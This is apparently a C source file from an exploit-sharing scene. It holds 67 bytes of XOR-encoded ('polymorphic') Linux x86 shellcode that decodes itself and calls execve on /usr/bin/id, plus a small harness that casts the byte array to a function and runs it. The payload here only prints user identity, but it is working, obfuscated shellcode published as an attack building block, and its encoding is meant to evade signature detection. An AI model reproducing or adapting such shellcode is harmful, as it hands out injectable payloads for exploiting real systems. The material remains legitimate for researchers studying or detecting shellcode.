/*
 * sys_execve("/usr/bin/id", { "/usr/bin/id", NULL }, NULL) 67 bytes polymorphic shellcode
 *
 * tesla_ (gandung@ppp.cylab.cmu.edu)
 */

/*
 * Tested in : 
 * - BackTrack 5 (linux-2.6.38-generic)
 * - Ubuntu 10.10 Maverick Meerkat (linux-2.6.38-generic)
 * - Ubuntu 11.04 Natty Narwhal
 * - Debian Squeeze 6.0.2 (linux-2.6.32-5-stable)
 */

#include <stdio.h>
#include <string.h>

char id[] = "\xeb\x0d\x5e\x31\xc9\xb1\x2f\x80\x36\x77"
	    "\x46\xe2\xfa\xeb\x05\xe8\xee\xff\xff\xff"
	    "\x46\xb7\xf4\x9b\x76\xff\x73\x53\x1f\x19"
	    "\x58\x1e\x13\x1f\x05\x58\x15\x1e\x11\x1f"
	    "\x02\x04\xf4\x9b\x76\xb1\x73\x53\x58\xfe"
	    "\x94\x27\x24\xc7\x7c\xfe\x96\x46\xa5\xba"
	    "\xf7\x46\xac\xc7\x76\xba\xf7";

int main(void) {
  int id_len = strlen(id);
  printf("[+] Using mutation key engine : 0x77\n");
  printf("[+] Length of this shellcode is : %d bytes\n\n", id_len);
  (*(void(*)())id)();
  return 0;
}

/* devilzc0de.org, hacker-newbie.org, sdf.lonestar.org, 1337day.com */